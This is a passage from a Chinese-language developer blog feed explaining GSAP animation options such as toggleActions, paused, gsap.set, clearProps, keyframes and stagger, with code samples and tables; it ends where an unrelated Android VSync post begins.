pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">toggleActions: "play none none reverse"  是什么意思</h2>
<pre><code class="hljs language-js" lang="js">gsap.<span class="hljs-title function_">to</span>(panel, {
<span class="hljs-attr">y</span>: <span class="hljs-number">0</span>,
<span class="hljs-attr">opacity</span>: <span class="hljs-number">1</span>,
<span class="hljs-attr">duration</span>: <span class="hljs-number">0.8</span>,
<span class="hljs-attr">ease</span>: <span class="hljs-string">"power2.out"</span>, 
<span class="hljs-attr">scrollTrigger</span>: {
<span class="hljs-attr">trigger</span>: panel, 
<span class="hljs-attr">start</span>: <span class="hljs-string">"top 80%"</span>, <span class="hljs-comment">// 当 panel 的顶部到达 viewport 的 80% 位置时，进入触发区</span>
<span class="hljs-attr">end</span>: <span class="hljs-string">"top 40%"</span>, <span class="hljs-comment">// 当 panel 的顶部到达 viewport 的 40% 位置时，离开触发区 </span>
<span class="hljs-attr">toggleActions</span>: <span class="hljs-string">"play none none reverse"</span>
} 
});
</code></pre>






























<table><thead><tr><th>位置</th><th>触发时机</th><th>说明</th></tr></thead><tbody><tr><td>1. <code>onEnter</code></td><td>元素从上往下滚动进入触发区间（比如进入 <code>start</code> 到 <code>end</code> 区域）</td><td>此处是 <code>"play"</code> → 播放动画</td></tr><tr><td>2. <code>onLeave</code></td><td>元素继续向下滚动，离开触发区间（滚出 <code>end</code> 之后）</td><td>此处是 <code>"none"</code> → 什么都不做</td></tr><tr><td>3. <code>onEnterBack</code></td><td>元素从下往上滚动，重新进入触发区间（反向滚动进入）</td><td>此处是 <code>"none"</code> → 什么都不做</td></tr><tr><td>4. <code>onLeaveBack</code></td><td>元素继续向上滚动，离开触发区间（反向滚出 <code>start</code> 之前）</td><td>此处是 <code>"reverse"</code> → 反向播放动画（即倒放）</td></tr></tbody></table>
<h4 data-id="heading-1"><code>toggleActions</code></h4>





































<table><thead><tr><th>动作值</th><th>效果</th></tr></thead><tbody><tr><td><code>"play"</code></td><td>播放动画（从当前进度开始）</td></tr><tr><td><code>"pause"</code></td><td>暂停动画</td></tr><tr><td><code>"resume"</code></td><td>恢复播放（如果已暂停）</td></tr><tr><td><code>"reverse"</code></td><td>反向播放（倒放）</td></tr><tr><td><code>"restart"</code></td><td>从头开始播放</td></tr><tr><td><code>"reset"</code></td><td>重置到初始状态</td></tr><tr><td><code>"none"</code></td><td>无操作（保持当前状态）</td></tr></tbody></table>
<h4 data-id="heading-2"> 典型使用场景对比：</h4>

























<table><thead><tr><th>需求</th><th>推荐 <code>toggleActions</code></th></tr></thead><tbody><tr><td>进入播放，离开重置</td><td><code>"play none none reset"</code></td></tr><tr><td>进入播放，反向离开时倒放</td><td><code>"play none none reverse"</code> ← 你的情况</td></tr><tr><td>只播放一次，之后不再动</td><td><code>"play pause pause pause"</code></td></tr><tr><td>来回都播放</td><td><code>"play play play play"</code>（不推荐，会闪烁）</td></tr></tbody></table>
<h2 data-id="heading-3">paused: true是什么意思</h2>
<pre><code class="hljs language-const" lang="const">{
x: 280, 
scale: 0.5,
opacity: 0,
duration: 1,
ease: "power2.out",
paused: true 
});

</code></pre>
<p>在 GSAP（GreenSock Animation Platform）中，<code>paused: true</code> 是一个<strong>动画配置选项</strong>，它的作用是：</p>
<blockquote>
<p><strong>创建动画时立即暂停（不自动播放），等待后续手动控制播放。</strong></p>
</blockquote>
<ul>
<li><code>gsap.from(...)</code> 表示：<strong>从指定的起始状态（x=280, scale=0.5, opacity=0）动画到元素当前的 CSS 状态</strong>。</li>
<li>但由于设置了 <code>paused: true</code>，这个动画<strong>不会立刻执行</strong>，而是被“冻结”在初始状态（即元素保持原样，不会动）。</li>
<li>你需要<strong>手动调用</strong> <code>tween.play()</code> 才会开始播放动画。</li>
</ul>
<h4 data-id="heading-4">✅ 为什么需要 <code>paused: true</code>？</h4>
<p>通常用于以下场景：</p>
<h5 data-id="heading-5">1. <strong>延迟触发动画</strong></h5>
<p>比如点击按钮、滚动到某位置、或满足某个条件后再播放：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'#btn'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> { 
tween.<span class="hljs-title function_">play</span>(); <span class="hljs-comment">// 点击时才播放</span>
});
</code></pre>
<h5 data-id="heading-6">2. <strong>配合 ScrollTrigger 或其他交互逻辑</strong></h5>
<p>你可能先定义好动画，等 ScrollTrigger 初始化完成后再关联：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">ScrollTrigger</span>.<span class="hljs-title function_">create</span>({
<span class="hljs-attr">trigger</span>: <span class="hljs-string">".section"</span>,
<span class="hljs-attr">start</span>: <span class="hljs-string">"top center"</span>,
<span class="hljs-attr">onEnter</span>: <span class="hljs-function">() =&gt;</span> tween.<span class="hljs-title function_">play</span>()
});
</code></pre>
<h5 data-id="heading-7">3. <strong>复用动画</strong></h5>
<p>同一个 <code>tween</code> 可以多次 <code>play()</code>、<code>reverse()</code>、<code>restart()</code>，而不会重复创建。</p>

































<table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td><code>tween.play()</code></td><td>播放动画</td></tr><tr><td><code>tween.pause()</code></td><td>暂停动画</td></tr><tr><td><code>tween.reverse()</code></td><td>反向播放（从当前进度倒放回起点）</td></tr><tr><td><code>tween.restart()</code></td><td>从头开始播放</td></tr><tr><td><code>tween.seek(0.5)</code></td><td>跳转到动画 50% 进度</td></tr><tr><td><code>tween.progress(1)</code></td><td>瞬间跳到结束状态</td></tr></tbody></table>

















<table><thead><tr><th>配置</th><th>含义</th></tr></thead><tbody><tr><td><code>paused: true</code></td><td>创建动画但不自动播放，需手动调用 <code>.play()</code> 等方法控制</td></tr><tr><td>默认（不写）</td><td>动画创建后立即自动播放</td></tr></tbody></table>
<h2 data-id="heading-8">gsap.set()  set 是什么意思</h2>
<p>在 GSAP（GreenSock Animation Platform）中，<code>gsap.set()</code> 是一个<strong>立即设置元素属性</strong>的方法，<strong>不会产生动画过渡</strong>，而是<strong>瞬间应用指定的样式或属性值</strong>。</p>






























<table><thead><tr><th>方法</th><th>是否动画</th><th>用途</th></tr></thead><tbody><tr><td><code>gsap.set(target, vars)</code></td><td>❌ 否</td><td>立即设置属性（相当于“初始化状态”）</td></tr><tr><td><code>gsap.to(target, vars)</code></td><td>✅ 是</td><td>从当前状态 动画到 指定状态</td></tr><tr><td><code>gsap.from(target, vars)</code></td><td>✅ 是</td><td>从指定状态 动画到 当前状态</td></tr><tr><td><code>gsap.fromTo(target, fromVars, toVars)</code></td><td>✅ 是</td><td>自定义起始和结束状态</td></tr></tbody></table>
<h2 data-id="heading-9">clearProps: "all"是什么意思</h2>
<p>gsap.set([boxA, boxB], { clearProps: "all" });
这行代码的作用是：</p>
<blockquote>
<p><strong>立即清除 <code>boxA</code> 和 <code>boxB</code> 元素上由 GSAP 设置的所有内联样式属性（比如 <code>transform</code>, <code>opacity</code>, <code>backgroundColor</code> 等），让它们恢复到 GSAP 干预之前的状态（即仅受 CSS 类或原始 HTML 样式控制）。</strong></p>
</blockquote>
<hr/>
<h4 data-id="heading-10">✅ <code>clearProps</code> 的作用详解</h4>
<ul>
<li>GSAP 在执行动画（如 <code>gsap.to()</code>、<code>gsap.from()</code>）或 <code>gsap.set()</code> 时，会<strong>直接写入元素的 <code>style</code> 属性</strong>（例如：<code>&lt;div style="transform: translateX(100px); opacity: 0.5;"&gt;</code>）。</li>
<li>这些内联样式优先级很高，会覆盖你写的 CSS 类。</li>
<li>使用 <code>clearProps</code> 可以<strong>清理这些“残留”的内联样式</strong>，避免干扰后续布局或样式。</li>
</ul>

























<table><thead><tr><th>值</th><th>说明</th></tr></thead><tbody><tr><td><code>"all"</code></td><td>清除 所有 GSAP 设置过的内联样式（最常用）✅</td></tr><tr><td><code>"transform"</code></td><td>仅清除 <code>transform</code> 相关属性（如 <code>x</code>, <code>y</code>, <code>scale</code>, <code>rotation</code> 等）</td></tr><tr><td><code>"opacity,backgroundColor"</code></td><td>清除指定的多个属性（用逗号分隔）</td></tr><tr><td><code>"x,y"</code></td><td>仅清除 <code>x</code> 和 <code>y</code>（即 <code>transform: translateX/Y</code>）</td></tr></tbody></table>
<p>💡 注意：<code>clearProps</code> 只清除 <strong>GSAP 显式设置过</strong> 的属性，不会影响其他 JavaScript 或 HTML 中原本就有的 <code>style</code>。</p>
<h4 data-id="heading-11">🎯 使用场景举例</h4>
<h5 data-id="heading-12">场景 1：重置动画状态</h5>
<p>js</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// 先执行一个动画</span>
gsap.<span class="hljs-title function_ invoke__">to</span>(boxA, { <span class="hljs-attr">x</span>: <span class="hljs-number">100</span>, <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">"red"</span>, <span class="hljs-attr">duration</span>: <span class="hljs-number">1</span> });

<span class="hljs-comment">// 后来想让它完全回到原始 CSS 样式</span>
gsap.<span class="hljs-title function_ invoke__">set</span>(boxA, { <span class="hljs-attr">clearProps</span>: <span class="hljs-string">"all"</span> });
<span class="hljs-comment">// 效果相当于：boxA.style.cssText = ""; （但更安全，只清 GSAP 设置的）</span>
</code></pre>
<h5 data-id="heading-13">场景 2：避免 transform 冲突</h5>
<p>css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.my-box</span> {
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">10deg</span>); <span class="hljs-comment">/* 原始 CSS transform */</span>
}
</code></pre>
<p>js</p>
<pre><code class="hljs language-php" lang="php">gsap.<span class="hljs-title function_ invoke__">to</span>(<span class="hljs-string">".my-box"</span>, { <span class="hljs-attr">x</span>: <span class="hljs-number">50</span> }); <span class="hljs-comment">// GSAP 会合并 transform，变成 rotate + translate</span>
gsap.<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">".my-box"</span>, { <span class="hljs-attr">clearProps</span>: <span class="hljs-string">"transform"</span> }); <span class="hljs-comment">// 清除后，只剩 rotate(10deg)</span>
</code></pre>
<h5 data-id="heading-14">场景 3：组件销毁前清理</h5>
<p>在 React/Vue 组件卸载时，清除 GSAP 添加的样式，防止内存泄漏或样式残留。</p>
<hr/>
<h4 data-id="heading-15">⚠️ 注意事项</h4>
<ol>
<li><strong><code>clearProps: "all"</code> 不会删除非 GSAP 设置的内联样式</strong><br/>
比如你手动写了 <code>&lt;div style="color: blue"&gt;</code>，GSAP 不会动它。</li>
<li><strong><code>transform</code> 是一个整体</strong><br/>
即使你只设置了 <code>x: 100</code>，<code>clearProps: "transform"</code> 也会清除整个 <code>transform</code> 字符串。</li>
<li><strong><code>autoAlpha</code> 会同时影响 <code>opacity</code> 和 <code>visibility</code></strong><br/>
如果你用了 <code>autoAlpha</code>，需要同时清除这两个属性。</li>
</ol>













<table><thead><tr><th>代码</th><th>作用</th></tr></thead><tbody><tr><td><code>gsap.set(el, { clearProps: "all" })</code></td><td>彻底清除 GSAP 对该元素设置的所有内联样式，恢复“干净”状态</td></tr></tbody></table>
<h2 data-id="heading-16">keyframes是什么意思</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> tween = gsap.<span class="hljs-title function_">to</span>(shape, {
        <span class="hljs-attr">keyframes</span>: [
          { <span class="hljs-attr">x</span>: -<span class="hljs-number">160</span>, <span class="hljs-attr">rotation</span>: -<span class="hljs-number">15</span>, <span class="hljs-attr">duration</span>: <span class="hljs-number">0.4</span> },
          { <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">scale</span>: <span class="hljs-number">1.2</span>, <span class="hljs-attr">duration</span>: <span class="hljs-number">0.4</span> },
          { <span class="hljs-attr">x</span>: <span class="hljs-number">160</span>, <span class="hljs-attr">rotation</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">duration</span>: <span class="hljs-number">0.4</span> },
          { <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">scale</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">rotation</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">duration</span>: <span class="hljs-number">0.4</span> }
        ],
        <span class="hljs-attr">ease</span>: <span class="hljs-string">"power1.inOut"</span>,
        <span class="hljs-attr">paused</span>: <span class="hljs-literal">true</span>
      });
</code></pre>
<p>在 GSAP（GreenSock Animation Platform）中，<code>keyframes</code> 是一种<strong>将多个动画步骤串联起来</strong>的方式，类似于 CSS 的 <code>@keyframes</code>，但功能更强大、更灵活。</p>
<p>这段代码的意思是：</p>
<blockquote>
<p><strong>对 <code>shape</code> 元素执行一个由 4 个关键帧组成的复合动画，每个关键帧持续 0.4 秒，总共 1.6 秒。动画被暂停（<code>paused: true</code>），需手动调用 <code>.play()</code> 才会运行。</strong></p>
</blockquote>
<hr/>
<h4 data-id="heading-17">✅ <code>keyframes</code> 的工作原理</h4>
<ul>
<li>每个对象代表一个<strong>动画阶段（关键帧）</strong> 。</li>
<li>GSAP 会<strong>按顺序依次播放</strong>这些关键帧。</li>
<li>每一帧的属性是从<strong>上一帧的结束状态</strong>过渡到当前帧的目标值。</li>
<li>每帧可以有自己的 <code>duration</code>、<code>ease</code>（如果未指定，则继承外层的 <code>ease</code>）。</li>
</ul>
<h5 data-id="heading-18">动画流程分解：</h5>






























<table><thead><tr><th>阶段</th><th>起始状态 → 目标状态</th><th>效果</th></tr></thead><tbody><tr><td>第1帧</td><td>当前状态 → <code>{x: -160, rotation: -15}</code></td><td>向左飞 + 左转</td></tr><tr><td>第2帧</td><td>上一帧结束 → <code>{x: 0, scale: 1.2}</code></td><td>回到中心 + 放大</td></tr><tr><td>第3帧</td><td>上一帧结束 → <code>{x: 160, rotation: 20}</code></td><td>向右飞 + 右转</td></tr><tr><td>第4帧</td><td>上一帧结束 → <code>{x: 0, scale: 1, rotation: 0}</code></td><td>回到原位 + 还原大小和角度</td></tr></tbody></table>
<h4 data-id="heading-19">🔧 <code>keyframes</code> 的高级用法</h4>
<h5 data-id="heading-20">1. <strong>每帧可单独设置缓动（ease）</strong></h5>
<p>js</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">keyframes:</span> [
  { <span class="hljs-attr">x:</span> <span class="hljs-number">100</span>, <span class="hljs-attr">duration:</span> <span class="hljs-number">0.3</span>, <span class="hljs-attr">ease:</span> <span class="hljs-string">"back.out"</span> },
  { <span class="hljs-attr">x:</span> <span class="hljs-number">0</span>, <span class="hljs-attr">duration:</span> <span class="hljs-number">0.3</span>, <span class="hljs-attr">ease:</span> <span class="hljs-string">"elastic.out"</span> }
]
</code></pre>
<h5 data-id="heading-21">2. <strong>支持回调函数</strong></h5>
<p>js</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">keyframes:</span> [
  { <span class="hljs-attr">x:</span> <span class="hljs-number">100</span>, <span class="hljs-attr">duration:</span> <span class="hljs-number">0.5</span> },
  { 
    <span class="hljs-attr">x:</span> <span class="hljs-number">0</span>, 
    <span class="hljs-attr">duration:</span> <span class="hljs-number">0.5</span>,
    <span class="hljs-attr">onComplete:</span> <span class="hljs-string">()</span> <span class="hljs-string">=&gt;</span> <span class="hljs-string">console.log("第二帧完成")</span> 
  }
]
</code></pre>
<h5 data-id="heading-22">3. <strong>与 ScrollTrigger、Timeline 结合</strong></h5>
<p>js</p>
<pre><code class="hljs language-php" lang="php">gsap.<span class="hljs-title function_ invoke__">timeline</span>({
  <span class="hljs-attr">scrollTrigger</span>: { <span class="hljs-attr">trigger</span>: <span class="hljs-string">".section"</span>, <span class="hljs-attr">start</span>: <span class="hljs-string">"top center"</span> }
}).<span class="hljs-title function_ invoke__">to</span>(shape, {
  <span class="hljs-attr">keyframes</span>: [ <span class="hljs-comment">/* ... */</span> ]
});
</code></pre>
<hr/>
<h4 data-id="heading-23">⚠️ 注意事项</h4>
<ul>
<li><code>keyframes</code> 是 <strong>GSAP 3.0+</strong>  引入的功能，在旧版本中不可用。</li>
<li>外层的 <code>ease</code>（如你的 <code>"power1.inOut"</code>）会作为<strong>默认缓动</strong>应用到每一帧（除非某帧自己指定了 <code>ease</code>）。</li>
<li>如果某帧没有指定 <code>duration</code>，它会继承前一帧的 <code>duration</code> 或使用默认值（通常为 0.3 秒）。</li>
</ul>
<hr/>
<h4 data-id="heading-24">✅ 为什么用 <code>keyframes</code> 而不用多个 <code>gsap.to()</code>？</h4>
<p>表格</p>

















<table><thead><tr><th>方式</th><th>优点</th></tr></thead><tbody><tr><td><code>keyframes</code></td><td>代码更紧凑，自动串联，易于管理单个动画序列</td></tr><tr><td>多个 <code>gsap.to()</code></td><td>更灵活（可插入延迟、回调等），适合复杂编排（推荐用 <code>gsap.timeline()</code>）</td></tr></tbody></table>
<blockquote>
<p>对于简单的线性多步动画，<code>keyframes</code> 非常简洁；对于复杂时间轴，建议用 <code>gsap.timeline()</code>。</p>
</blockquote>
<hr/>
<blockquote>
<p><strong><code>keyframes</code> = 把多个动画步骤写在一个数组里，GSAP 自动按顺序播放它们。</strong></p>
</blockquote>
<p>你的代码创建了一个“左右晃动 + 缩放”的弹性动画，常用于：</p>
<ul>
<li>按钮点击反馈</li>
<li>错误提示抖动</li>
<li>卡片翻转/弹跳效果</li>
</ul>
<p>配合 <code>paused: true</code>，你可以在需要时（如点击、滚动）通过 <code>tween.play()</code> 触发动画，非常高效！</p>
<h2 data-id="heading-25">stagger 是什么意思</h2>
<p>在 GSAP（GreenSock Animation Platform）中，<strong><code>stagger</code></strong> 是一个非常强大的功能，用于<strong>对多个目标元素（如数组、NodeList）依次错开播放动画</strong>，从而创建出“波浪式”、“逐个入场”等流畅的序列动画效果。</p>
<pre><code class="hljs language-js" lang="js"> <span class="hljs-keyword">const</span> tween = gsap.<span class="hljs-title function_">from</span>(cells, {
        <span class="hljs-attr">opacity</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">scale</span>: <span class="hljs-number">0.4</span>,
        <span class="hljs-attr">y</span>: <span class="hljs-number">20</span>,
        <span class="hljs-attr">duration</span>: <span class="hljs-number">0.6</span>,
        <span class="hljs-attr">ease</span>: <span class="hljs-string">"power2.out"</span>,
       <span class="hljs-attr">stagger</span>: { 
           <span class="hljs-attr">each</span>: <span class="hljs-number">0.04</span>, <span class="hljs-comment">// 每个元素之间的延迟时间（秒）</span>
           <span class="hljs-attr">from</span>: <span class="hljs-string">"center"</span> <span class="hljs-comment">// 动画从中间的元素开始，向两边扩散</span>
       },
        <span class="hljs-attr">paused</span>: <span class="hljs-literal">true</span>
      });
</code></pre>
<p>这段代码的作用是：</p>
<blockquote>
<p><strong>对 <code>cells</code>（一组 DOM 元素）执行“从透明、缩小、下移”状态淡入放大的动画，但不是同时播放，而是：</strong></p>
<ul>
<li><strong>从中间的元素开始</strong></li>
<li><strong>相邻元素之间间隔 0.04 秒依次播放</strong></li>
<li>整体形成一种“由中心向外扩散”的入场效果 ✨</li>
</ul>
</blockquote>
<hr/>
<h4 data-id="heading-26">✅ <code>stagger</code> 的核心概念</h4>
<p>当你对<strong>多个元素</strong>（如 <code>document.querySelectorAll('.cell')</code>）使用 GSAP 动画时：</p>
<ul>
<li><strong>不加 <code>stagger</code></strong> → 所有元素<strong>同时</strong>动画。</li>
<li><strong>加上 <code>stagger</code></strong> → 元素<strong>依次错开</strong>动画，产生节奏感。</li>
</ul>
<hr/>
<h4 data-id="heading-27">🔧 <code>stagger</code> 的常见写法</h4>
<h5 data-id="heading-28">1. <strong>最简形式：只指定间隔时间</strong></h5>
<p>js</p>
<pre><code class="hljs language-css" lang="css">stagger: <span class="hljs-number">0.1</span>  // 等价于 { each: <span class="hljs-number">0.1</span> }
</code></pre>
<p>→ 从第一个元素开始，每个间隔 0.1 秒。</p>
<h5 data-id="heading-29">2. <strong>对象形式（你用的方式）：更精细控制</strong></h5>
<p>js</p>
<pre><code class="hljs language-perl" lang="perl">stagger: {
  <span class="hljs-keyword">each</span>: <span class="hljs-number">0</span>.<span class="hljs-number">04</span>,     <span class="hljs-regexp">//</span> 每个元素间隔 <span class="hljs-number">0</span>.<span class="hljs-number">04</span> 秒
  from: <span class="hljs-string">"center"</span>, <span class="hljs-regexp">//</span> 起始位置：可选 <span class="hljs-string">"start"</span>（默认）、<span class="hljs-string">"center"</span>、<span class="hljs-string">"end"</span> 或具体索引（如 <span class="hljs-number">3</span>）
  grid: <span class="hljs-string">"auto"</span>,   <span class="hljs-regexp">//</span> 如果是网格布局，可设为 [rows, cols] 来按行/列交错
  axis: <span class="hljs-string">"x"</span>       // 在网格中限制交错方向（<span class="hljs-string">"x"</span>、<span class="hljs-string">"y"</span> 或 <span class="hljs-string">"xy"</span>）
}
</code></pre>
<hr/>
<h4 data-id="heading-30">🎯 <code>from</code> 的取值说明</h4>

























<table><thead><tr><th>值</th><th>效果</th></tr></thead><tbody><tr><td><code>"start"</code>（默认）</td><td>从第一个元素开始，依次到最后一个</td></tr><tr><td><code>"center"</code></td><td>从中间元素开始，向左右（或上下）同时扩散</td></tr><tr><td><code>"end"</code></td><td>从最后一个元素开始，倒序播放</td></tr><tr><td><code>数字（如 2）</code></td><td>从索引为 2 的元素开始</td></tr></tbody></table>
<p>✅  <code>from: "center"</code> 非常适合<strong>居中对齐的列表、图标阵列、卡片网格</strong>等场景，视觉上更平衡。</p>
<hr/>
<h4 data-id="heading-31">💡 实际效果示例</h4>
<p>假设 <code>cells</code> 有 5 个元素：<code>[A, B, C, D, E]</code></p>
<ul>
<li><code>from: "center"</code> → 播放顺序：<strong>C → B &amp; D → A &amp; E</strong></li>
<li>每个间隔 <code>0.04s</code>，所以整个动画在约 <code>0.04 × 2 = 0.08s</code> 内完成扩散（因为两边并行）</li>
</ul>
<blockquote>
<p>这比线性播放（A→B→C→D→E）更生动！</p>
</blockquote>
<hr/>
<h4 data-id="heading-32">⚠️ 注意事项</h4>
<ul>
<li><code>stagger</code> <strong>只在目标是多个元素时生效</strong>。如果 <code>cells</code> 只有一个元素，<code>stagger</code> 会被忽略。</li>
<li><code>stagger</code> 的延迟是<strong>叠加在 <code>duration</code> 之上的</strong>，不影响单个动画的时长。</li>
<li>可与 <code>paused: true</code> 完美配合，实现“按需触发动画序列”。</li>
</ul>
<hr/>













<table><thead><tr><th>配置</th><th>含义</th></tr></thead><tbody><tr><td><code>stagger: { each: 0.04, from: "center" }</code></td><td><strong>从中间元素开始，以 0.04 秒的间隔向两侧依次播放动画</strong></td></tr></tbody></table>
<p>这是 GSAP 实现<strong>高级交互动效</strong>（如列表加载、菜单展开、数据可视化入场）的核心技巧之一。你的代码就是一个典型的“优雅批量入场”动画！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android VSync 笔记]]></title>    <link>https://juejin.cn/post/7605810996125007906</link>    <guid>https://juejin.cn/post/7605810996125007906</guid>    <pubDate>2026-02-13T02:36:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605810996125007906" data-draft-id="7605542907118862388" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android VSync 笔记"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-13T02:36:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="心源xinyuan"/> <meta itemprop="url" content="https://juejin.cn/user/4283353029151694"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android VSync 笔记
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4283353029151694/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    心源xinyuan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:36:21.000Z" title="Fri Feb 13 2026 02:36:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media 